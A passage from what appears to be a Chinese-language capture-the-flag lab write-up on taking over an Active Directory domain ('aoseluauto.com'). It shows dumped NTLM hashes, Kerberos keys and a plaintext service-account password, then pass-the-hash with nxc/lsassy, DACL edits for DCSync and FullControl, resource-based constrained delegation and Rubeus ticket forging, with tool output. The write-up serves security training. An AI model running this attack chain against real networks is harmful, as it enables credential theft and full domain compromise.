class="number">188</span>fe60f47efe9693471b3684966d4039c413ecc88a4aee6f47c71b2c1674f35</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">12</span>a677d89007b4add587b4bccf1d5f64</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">68</span>ea7f625d8f191c</span><br><span class="line">    OldCredentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">3</span>f62f69b60fce562d1bf07bc11550eb05636382c39d6121142f2493aa191a411</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : b4dfb71180ba6d0f86f6145dcd98df2e</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">5</span>bd37a57b3790483</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : ASLSRVFS02.AOSELUAUTO.COMAdministrator</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : <span class="number">68</span>ea7f625d8f191c</span><br><span class="line">    OldCredentials</span><br><span class="line">      des_cbc_md5       : <span class="number">5</span>bd37a57b3790483</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f5 (<span class="number">501</span>)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f7 (<span class="number">503</span>)</span><br><span class="line">User : DefaultAccount</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f8 (<span class="number">504</span>)</span><br><span class="line">User : WDAGUtilityAccount</span><br><span class="line">  Hash NTLM: <span class="number">3</span>d23ddf5c2e625618408ee0ce3b888cb</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">67</span>e9590d1dacf510060b878de44923ed</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer-Keys</span> *</span><br><span class="line">    Default Salt : WDAGUtilityAccount</span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : ef3800dc9b13f309ed0aae0bd11f788f9c2ec01f39ecda41b53cff136f329683</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">89288</span>ad0ec267eb06faff6671686209a</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">198</span>c08e97c94e38f</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : WDAGUtilityAccount</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : <span class="number">198</span>c08e97c94e38f</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h4><p>获取到02管理员的hash为</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">74</span>aaf464e1a7a75f2123ada1dd62edab</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/43.png"></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/44.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Extranet <span class="number">172.16</span>.<span class="number">53.30</span>  已拿下  反序列化打内存马 cve<span class="literal">-2025-32463</span></span><br><span class="line">ASLITPC03 <span class="number">172.16</span>.<span class="number">36.21</span>   已拿下  mysql udf potato  winauto自动登录账密</span><br><span class="line">ASLSRVFS02 <span class="number">172.16</span>.<span class="number">34.23</span>  已拿下  winauto账密泄露 注册表转存 抓取hash提权</span><br><span class="line">ASLSRVAD05 <span class="number">172.16</span>.<span class="number">34.5</span>  DC</span><br></pre></td></tr></table></figure><p>接下来就重新抓取一下hash，然后利用writedacl拿下域控了</p><h3 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h3><p>利用writedacl的方法有很多，这里我的初想法还是Dcsync（想偷懒）</p><p>可以直接利用nxc转存hash</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 <span class="literal">-q</span> nxc smb <span class="number">172.16</span>.<span class="number">34.23</span> <span class="literal">-u</span> Administrator <span class="literal">-H</span> <span class="number">74</span>aaf464e1a7a75f2123ada1dd62edab <span class="literal">--local-auth</span> <span class="literal">-M</span> lsassy</span><br></pre></td></tr></table></figure><p>还是得rdp上去，不然抓取不到，应该是开了wd的原因</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/45.png"></p><p>果然</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/46.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Hundredsu)-[~]</span><br><span class="line">└─<span class="comment"># proxychains4 -q nxc smb 172.16.34.23 -u Administrator -H 74aaf464e1a7a75f2123ada1dd62edab --local-auth -M lsassy</span></span><br><span class="line">SMB         <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       [*] Windows <span class="number">10</span> / Server <span class="number">2019</span> Build <span class="number">17763</span> x64 (name:ASLSRVFS02) (domain:ASLSRVFS02) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       [+] ASLSRVFS02\Administrator:<span class="number">74</span>aaf464e1a7a75f2123ada1dd62edab (Pwn3d!)</span><br><span class="line">LSASSY      <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       ASLSRVFS02\Hundredsu <span class="number">72</span>d98c440b25ce7b05d81233044c020c</span><br><span class="line">LSASSY      <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       AOSELUAUTO\svc_bakadm01 <span class="number">95</span>f063de7e971e16bcc9d0e8fdd6e857</span><br><span class="line">LSASSY      <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       AOSELUAUTO\svc_monadm01 ab232c3cf9f4b7cf27602082b04f306b</span><br><span class="line">LSASSY      <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       aoseluauto.com\svc_monadm01 <span class="number">96</span>Mr!je39y_p</span><br></pre></td></tr></table></figure><p>那么现在继续</p><h4 id="wirteDACL-DCSync-没成功"><a href="#wirteDACL-DCSync-没成功" class="headerlink" title="wirteDACL+DCSync(没成功)"></a>wirteDACL+DCSync(没成功)</h4><p>添加DCSync权限</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(base) <span class="built_in">PS</span> D:\red\内网\免杀工具包\免杀工具包\impacket<span class="literal">-0</span>.<span class="number">12.0</span>\examples&gt; python dacledit.py aoseluauto.com/svc_monadm01 <span class="literal">-hashes</span> <span class="string">&quot;00000000000000000000000000000000:ab232c3cf9f4b7cf27602082b04f306b&quot;</span> <span class="literal">-action</span> <span class="built_in">write</span> <span class="literal">-rights</span> DCSync <span class="literal">-principal</span> svc_monadm01 <span class="literal">-target-dn</span> <span class="string">&quot;CN=ASLSRVAD05,OU=Domain Controllers,DC=aoseluauto,DC=com&quot;</span>  <span class="literal">-dc-ip</span> <span class="number">172.16</span>.<span class="number">34.5</span></span><br><span class="line">D:\Anaconda\Anaconda3\Lib\site<span class="literal">-packages</span>\requests\__init__.py:<span class="number">109</span>: RequestsDependencyWarning: urllib3 (<span class="number">2.3</span>.<span class="number">0</span>) or chardet (<span class="number">5.0</span>.<span class="number">0</span>)/charset_normalizer (<span class="number">2.0</span>.<span class="number">4</span>) doesn<span class="string">&#x27;t match a supported version!</span></span><br><span class="line"><span class="string">  warnings.warn(</span></span><br><span class="line"><span class="string">Impacket v0.9.23 - Copyright Fortra, LLC and its affiliated companies</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] DACL backed up to dacledit-20250710-192030.bak</span></span><br><span class="line"><span class="string">[*] DACL modified successfully!</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py aoseluauto.com/svc_monadm01@<span class="number">172.16</span>.<span class="number">34.5</span> <span class="literal">-hashes</span> <span class="string">&quot;00000000000000000000000000000000:ab232c3cf9f4b7cf27602082b04f306b&quot;</span> <span class="literal">-just-dc-ntlm</span></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/47.png"></p><p>没成功</p><h4 id="writeDACL-RBCD"><a href="#writeDACL-RBCD" class="headerlink" title="writeDACL+RBCD"></a>writeDACL+RBCD</h4><p>还是老老实实吧</p><p>添加恶意主机</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python addcomputer.py <span class="literal">-computer-name</span> <span class="string">&#x27;test$&#x27;</span> <span class="literal">-computer-pass</span> <span class="string">&#x27;123@#ABC&#x27;</span> <span class="string">&#x27;aoseluauto.com/svc_monadm01&#x27;</span> <span class="literal">-hashes</span> :ab232c3cf9f4b7cf27602082b04f306b <span class="literal">-dc-ip</span> <span class="number">172.16</span>.<span class="number">34.5</span></span><br></pre></td></tr></table></figure><p>利用 WriteDacl修改目标的 DACL，添加指定用户对该主机的完全控制权限</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dacledit.py <span class="literal">-action</span> <span class="string">&#x27;write&#x27;</span> <span class="literal">-rights</span> <span class="string">&#x27;FullControl&#x27;</span> <span class="literal">-principal</span> <span class="string">&#x27;svc_monadm01&#x27;</span> <span class="literal">-target-dn</span> <span class="string">&#x27;CN=ASLSRVAD05,OU=Domain Controllers,DC=aoseluauto,DC=com&#x27;</span> <span class="string">&#x27;aoseluauto.com/svc_monadm01&#x27;</span> <span class="literal">-hashes</span> :ab232c3cf9f4b7cf27602082b04f306b <span class="literal">-dc-ip</span> <span class="number">172.16</span>.<span class="number">34.5</span></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/48.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dacledit.py aoseluauto.com/svc_monadm01 <span class="literal">-hashes</span> <span class="string">&quot;00000000000000000000000000000000:ab232c3cf9f4b7cf27602082b04f306b&quot;</span> <span class="literal">-action</span> <span class="built_in">write</span> <span class="literal">-rights</span> FullControl <span class="literal">-principal</span> svc_monadm01 <span class="literal">-target-dn</span> <span class="string">&quot;CN=ASLSRVAD05,OU=Domain Controllers,DC=aoseluauto,DC=com&quot;</span>  <span class="literal">-dc-ip</span> <span class="number">172.16</span>.<span class="number">34.5</span></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/49.png"></p><p>在cmd输入一直出错，搞了好久</p><p>转powershell才行，应该是编码的问题</p><p>打rbcd,添加权限</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 rbcd.py <span class="literal">-delegate-from</span> <span class="string">&#x27;test$&#x27;</span> <span class="literal">-delegate-to</span> <span class="string">&#x27;ASLSRVAD05$&#x27;</span> <span class="literal">-action</span> <span class="string">&#x27;write&#x27;</span> <span class="string">&#x27;aoseluauto.com/svc_monadm01&#x27;</span> <span class="literal">-hashes</span> :ab232c3cf9f4b7cf27602082b04f306b <span class="literal">-dc-ip</span> <span class="number">172.16</span>.<span class="number">34.5</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(base) <span class="built_in">PS</span> D:\red\内网\免杀工具包\免杀工具包\impacket<span class="literal">-0</span>.<span class="number">12.0</span>\examples&gt; python rbcd.py <span class="literal">-delegate-from</span> <span class="string">&#x27;test$&#x27;</span> <span class="literal">-delegate-to</span> <span class="string">&#x27;ASLSRVAD05$&#x27;</span> <span class="literal">-action</span> <span class="string">&#x27;write&#x27;</span> <span class="string">&#x27;aoseluauto.com/svc_monadm01&#x27;</span> <span class="literal">-hashes</span> :ab232c3cf9f4b7cf27602082b04f306b <span class="literal">-dc-ip</span> <span class="number">172.16</span>.<span class="number">34.5</span></span><br><span class="line">D:\Anaconda\Anaconda3\Lib\site<span class="literal">-packages</span>\requests\__init__.py:<span class="number">109</span>: RequestsDependencyWarning: urllib3 (<span class="number">2.3</span>.<span class="number">0</span>) or chardet (<span class="number">5.0</span>.<span class="number">0</span>)/charset_normalizer (<span class="number">2.0</span>.<span class="number">4</span>) doesn<span class="string">&#x27;t match a supported version!</span></span><br><span class="line"><span class="string">  warnings.warn(</span></span><br><span class="line"><span class="string">Impacket v0.9.23 - Copyright Fortra, LLC and its affiliated companies</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty</span></span><br><span class="line"><span class="string">[*] Delegation rights modified successfully!</span></span><br><span class="line"><span class="string">[*] test$ can now impersonate users on ASLSRVAD05$ via S4U2Proxy</span></span><br><span class="line"><span class="string">[*] Accounts allowed to act on behalf of other identity:</span></span><br><span class="line"><span class="string">[*]     test$        (S-1-5-21-198605783-2356506617-271110585-1247)</span></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/50.png"></p><p>获取票据（没成功）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python getST.py <span class="literal">-spn</span> cifs/ASLSRVAD05.aoseluauto.com aoseluauto/test\<span class="variable">$</span>:<span class="string">&#x27;123@#ABC&#x27;</span> <span class="literal">-impersonate</span> SVC_ADM01 <span class="literal">-dc-ip</span> <span class="number">172.16</span>.<span class="number">34.5</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket<span class="literal">-getST</span> <span class="literal">-spn</span> cifs/ASLSRVAD05.aoseluauto.com aoseluauto/COMPUTER\<span class="variable">$</span>:<span class="string">&#x27;123@#ABC&#x27;</span> <span class="literal">-impersonate</span> SVC_ADM01 <span class="literal">-dc-ip</span> <span class="number">172.16</span>.<span class="number">34.5</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">kali</span>/<span class="type">red</span>/<span class="type">impacket</span>-<span class="number">0.11</span><span class="type">.0</span>/<span class="type">examples</span>]</span><br><span class="line">└─<span class="comment"># proxychains4 impacket-getST -spn cifs/ASLSRVAD05.aoseluauto.com aoseluauto/COMPUTER\$:&#x27;123@#ABC&#x27; -impersonate SVC_ADM01 -dc-ip 172.16.34.5                                                                   </span></span><br><span class="line">[<span class="type">proxychains</span>] config file found: /etc/proxychains4.conf</span><br><span class="line">[<span class="type">proxychains</span>] preloading /usr/lib/x86_64<span class="literal">-linux-gnu</span>/libproxychains.so.<span class="number">4</span></span><br><span class="line">[<span class="type">proxychains</span>] DLL init: proxychains<span class="literal">-ng</span> <span class="number">4.15</span></span><br><span class="line">[<span class="type">proxychains</span>] DLL init: proxychains<span class="literal">-ng</span> <span class="number">4.15</span></span><br><span class="line">[<span class="type">proxychains</span>] DLL init: proxychains<span class="literal">-ng</span> <span class="number">4.15</span></span><br><span class="line">Impacket v0.<span class="number">11.0</span> - Copyright <span class="number">2023</span> Fortra</span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> user</span><br><span class="line">[<span class="type">proxychains</span>] Strict chain  ...  <span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">1123</span>  ...  <span class="number">172.16</span>.<span class="number">34.5</span>:<span class="number">88</span>  ...  OK</span><br><span class="line">[<span class="type">proxychains</span>] Strict chain  ...  <span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">1123</span>  ...  <span class="number">172.16</span>.<span class="number">34.5</span>:<span class="number">88</span>  ...  OK</span><br><span class="line">Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>显示Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</p><p>需要向域控同步时间才能解决，但是我的kali一直无法同步</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ntpdate <span class="number">172.16</span>.<span class="number">34.5</span></span><br><span class="line"></span><br><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure><p>最后我选择换个方法请求票据，这里我重新弄了个恶意用户，害怕前面配错了 导致出问题</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/51.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">(base) <span class="built_in">PS</span> D:\red\内网\免杀工具包\免杀工具包\impacket<span class="literal">-0</span>.<span class="number">12.0</span>\examples&gt; python rbcd.py <span class="literal">-delegate-from</span> <span class="string">&#x27;EVILCOMPUTER$&#x27;</span> <span class="literal">-delegate-to</span> <span class="string">&#x27;ASLSRVAD05$&#x27;</span> <span class="literal">-action</span> <span class="string">&#x27;write&#x27;</span> <span class="string">&#x27;aoseluauto.com/svc_monadm01&#x27;</span> <span class="literal">-hashes</span> :ab232c3cf9f4b7cf27602082b04f306b <span class="literal">-dc-ip</span> <span class="number">172.16</span>.<span class="number">34.5</span></span><br><span class="line">D:\Anaconda\Anaconda3\Lib\site<span class="literal">-packages</span>\requests\__init__.py:<span class="number">109</span>: RequestsDependencyWarning: urllib3 (<span class="number">2.3</span>.<span class="number">0</span>) or chardet (<span class="number">5.0</span>.<span class="number">0</span>)/charset_normalizer (<span class="number">2.0</span>.<span class="number">4</span>) doesn<span class="string">&#x27;t match a supported version!</span></span><br><span class="line"><span class="string">  warnings.warn(</span></span><br><span class="line"><span class="string">Impacket v0.9.23 - Copyright Fortra, LLC and its affiliated companies</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty</span></span><br><span class="line"><span class="string">[*] Delegation rights modified successfully!</span></span><br><span class="line"><span class="string">[*] EVILCOMPUTER$ can now impersonate users on ASLSRVAD05$ via S4U2Proxy</span></span><br><span class="line"><span class="string">[*] Accounts allowed to act on behalf of other identity:</span></span><br><span class="line"><span class="string">[*]     EVILCOMPUTER$   (S-1-5-21-198605783-2356506617-271110585-1245)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(base) PS D:\red\内网\免杀工具包\免杀工具包\impacket-0.12.0\examples&gt; python rbcd.py -delegate-from &#x27;</span>COMPUTER<span class="variable">$</span><span class="string">&#x27; -delegate-to &#x27;</span>ASLSRVAD05<span class="variable">$</span><span class="string">&#x27; -action &#x27;</span><span class="built_in">write</span><span class="string">&#x27; &#x27;</span>aoseluauto.com/svc_monadm01<span class="string">&#x27; -hashes :ab232c3cf9f4b7cf27602082b04f306b -dc-ip 172.16.34.5</span></span><br><span class="line"><span class="string">D:\Anaconda\Anaconda3\Lib\site-packages\requests\__init__.py:109: RequestsDependencyWarning: urllib3 (2.3.0) or chardet (5.0.0)/charset_normalizer (2.0.4) doesn&#x27;</span>t match a supported version!</span><br><span class="line">  warnings.warn(</span><br><span class="line">Impacket v0.<span class="number">9.23</span> - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Accounts allowed to act on behalf of other identity:</span><br><span class="line">[*]     EVILCOMPUTER<span class="variable">$</span>   (S<span class="literal">-1-5-21-198605783-2356506617-271110585-1245</span>)</span><br><span class="line">[*] Delegation rights modified successfully!</span><br><span class="line">[*] COMPUTER<span class="variable">$</span> can now impersonate users on ASLSRVAD05<span class="variable">$</span> via S4U2Proxy</span><br><span class="line">[*] Accounts allowed to act on behalf of other identity:</span><br><span class="line">[*]     EVILCOMPUTER<span class="variable">$</span>   (S<span class="literal">-1-5-21-198605783-2356506617-271110585-1245</span>)</span><br><span class="line">[*]     COMPUTER<span class="variable">$</span>    (S<span class="literal">-1-5-21-198605783-2356506617-271110585-1246</span>)</span><br></pre></td></tr></table></figure><p>获取新增虚拟用户的rc4</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe hash /password:<span class="number">123</span><span class="selector-tag">@</span><span class="comment">#ABC /user:test$ /domain:aoseluauto.com</span></span><br></pre></td></tr></table></figure><p>这里一开始先是用的Administrator，但是被禁用了</p><p><code>[X] KRB-ERROR (18) : KDC_ERR_CLIENT_REVOKED</code></p><p>更换一个域管理员账号</p><p>这里的rc4记得改为自己的</p><p>请求票据并导入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:test<span class="variable">$</span> /rc4:<span class="number">3</span>A37C6AC3AFBEEF7A8EB36A4481BDED4 /domain:aoseluauto.com /msdsspn:cifs/ASLSRVAD05 /impersonateuser:SVC_ADM01 /nowrap /ptt /outfile:ticket.kirbi</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">C:\Users\hub&gt;Rubeus.exe s4u /user:test<span class="variable">$</span> /rc4:<span class="number">3</span>A37C6AC3AFBEEF7A8EB36A4481BDED4 /domain:aoseluauto.com /msdsspn:cifs/ASLSRVAD05 /impersonateuser:SVC_ADM01 /nowrap /ptt /outfile:ticket.kirbi</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">2.2</span></span><br><span class="line"></span><br><span class="line">[*] Action: S4U</span><br><span class="line"></span><br><span class="line">[*] <span class="keyword">Using</span> rc4_hmac hash: 3A37C6AC3AFBEEF7A8EB36A4481BDED4</span><br><span class="line">[*] Building AS<span class="literal">-REQ</span> (w/ preauth) <span class="keyword">for</span>: <span class="string">&#x27;aoseluauto.com\test$&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: 172.16.34.5:88</span><br><span class="line">[+] TGT request successful!</span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIFeDCCBXSgAwIBBaEDAgEWooIEijCCBIZhggSCMIIEfqADAgEFoRAbDkFPU0VMVUFVVE8uQ09NoiMwIaADAgECoRowGBsGa3JidGd0Gw5hb3NlbHVhdXRvLmNvbaOCBD4wggQ6oAMCARKhAwIBAqKCBCwEggQosvzRkTg69j8zlzYVH6ZyyZSQhKxigE/jNQl+lfY/bgIh/Y27t5IWy9JgYzgnvVXXFBY65+<span class="number">8</span>Mwk9MRdJbIQHk5PaoRZI9ww4VuImxz3ZF+U3KDOv7yDneM5NHvEYLf9XAKakKHGvIHMsPEi/sfPOzRGr6tlRGSpFUsRgUKH31z9EFxNRqzs5BMo3f1SFQageXWSEbyrCOzh5Jbljaw0ARWOtpzTrtCPq9vieSM2Tk2uFqppPbEbtDFMwewSxNd2ZscafImEch5kQasRLMPe7LiIJ6VsvzY0qwVF6/K9LF3W3wPDIwPFTjT3cIwN6I2nIOps1b0bFWBGqCRTqr0fdGb/+uf4SDXIlFgs3lc0dPrExzzmtBTaKCg+AbLVFE95ajgPXvx050Bj1Q73f99JnSmks9gZWJ2Z/Y4<span class="built_in">H</span>/wJ9ODNM11abODATr/<span class="number">8</span>PektowpZhSkRuIm3F8+YYOllA+ev9ZAeJaPb6y2mEEHCLfmKHLSFZTlCT2pfjFJWCW06WGPKojzYfRRnAYulGRAJYxgSYEI6Hq+bUXiJ3NyRl0CNSJR7WZXtn2Zkgs0KGOMr6XzpLwWxXZnjBCTO8QdgTCe0IZQ4WFFsnJR099AEeOkX2prozfbUAPbfz6HW7D4a6zNZdMfwG1cZWZaQUa6L2fnM/X8PEG5Dc3B8DNRubYyJ/FkcMG1ZOugW50FiBysRXhVRlmbkyX0wj0vjWLJiktk9MZa5Lq7vUskToJO8+vYIHsc7RDEm/z3cwnscr6MhAvNb7F2sr/<span class="number">4</span>GviLPiwix4wh1IInlEWXK00zqEDJijUxsVk4h6C3mumkp5iL22MdhYA9m9UdZLDTsP262LGTqpV7W9Ace88WKpPsJn6aWNQqH9pfETM3+<span class="number">7</span>s7hBCFq8956uBXMBn+<span class="number">4</span>XZDoWSXfpEH1GOtNE70YeCLds/PhK7VVkBbJUGM1ITHajv0Mru2Ejz02xtSA0EVcVj88am3UNOZxPcoiDM1srZQKtf+SHLQXlDfULlFccsa8OdRWMFZpcfy2PRk+<span class="number">0</span>AbMmbEIGzBL1FmlKp4wzSHOXoS/h9BYlt0XVp8vgjbi8i01LGe2d6tmYCy6TQBaO5qZOdi/e3JbOupzt/<span class="number">7</span>h0l14sJdoTNPKvkDN604pm7qFAGeebHKP9w9dcsHDoQ1QaWv8or9CT4tDk1gPnuwJ7luAsX30xKrLmvFe7tAAMGjMawF2CZYXrxCU8W8<span class="built_in">H</span>+orNxsEj23O8ZI2f81eiGHQPHSacxlnv+/eLRBtCZ30Al2ou/<span class="number">8</span>J9+B23Sb6JpPP0wJ1IoVBiXwEZRdbticCaE5nFX2rFaY4CzlXJzuxXKSIKIFhnxFFFtF3wV19Q04MSQvb3gHxEEsfc1y3T8sCR1+<span class="number">6</span>kn8p7BNemh25fLOarQUtZyfU12YAfYmZ/<span 